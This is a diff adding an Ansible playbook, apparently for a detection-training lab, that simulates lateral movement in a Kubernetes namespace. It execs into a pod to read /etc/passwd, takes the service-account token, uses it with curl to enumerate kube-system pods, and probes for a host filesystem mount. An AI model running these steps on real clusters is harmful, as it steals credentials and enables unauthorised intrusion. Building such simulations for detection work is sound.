@@ -1,0 +1,57 @@
+# Ansible playbook: Lateral movement simulation inside Kubernetes cluster
+# PURPOSE: generate labelled lateral-movement traffic for ML training dataset.
+---
+- name: Lateral Movement Simulation
+  hosts: localhost
+  gather_facts: false
+  vars:
+    target_namespace: securecloud
+    pivot_pod: "{{ lookup('env', 'PIVOT_POD') }}"   # export PIVOT_POD=<pod-name>
+    output_dir: /tmp/lateral-results
+
+  tasks:
+    - name: Create output directory
+      file:
+        path: "{{ output_dir }}"
+        state: directory
+
+    - name: Attempt exec into target pod (expect Falco alert)
+      command: >
+        kubectl exec -n {{ target_namespace }} {{ pivot_pod }}
+        -- /bin/sh -c "id; hostname; cat /etc/passwd"
+      register: exec_out
+      ignore_errors: true
+
+    - name: Log exec attempt
+      copy:
+        content: "{{ exec_out.stdout }}\n{{ exec_out.stderr }}"
+        dest: "{{ output_dir }}/exec_attempt.txt"
+
+    - name: Attempt to read service-account token
+      command: >
+        kubectl exec -n {{ target_namespace }} {{ pivot_pod }}
+        -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
+      register: token_out
+      ignore_errors: true
+
+    - name: Attempt cross-namespace pod enumeration via token
+      shell: |
+        TOKEN="{{ token_out.stdout }}"
+        curl -sk \
+          -H "Authorization: Bearer $TOKEN" \
+          https://kubernetes.default.svc/api/v1/namespaces/kube-system/pods
+      register: cross_ns_out
+      ignore_errors: true
+      when: token_out.rc == 0
+
+    - name: Save cross-namespace probe result
+      copy:
+        content: "{{ cross_ns_out.stdout | default('skipped') }}"
+        dest: "{{ output_dir }}/cross_ns_probe.json"
+
+    - name: Attempt mount of host filesystem
+      command: >
+        kubectl exec -n {{ target_namespace }} {{ pivot_pod }}
+        -- ls /host 2>/dev/null || echo "host-fs not mounted"
+      register: hostfs_out
+      ignore_errors: true
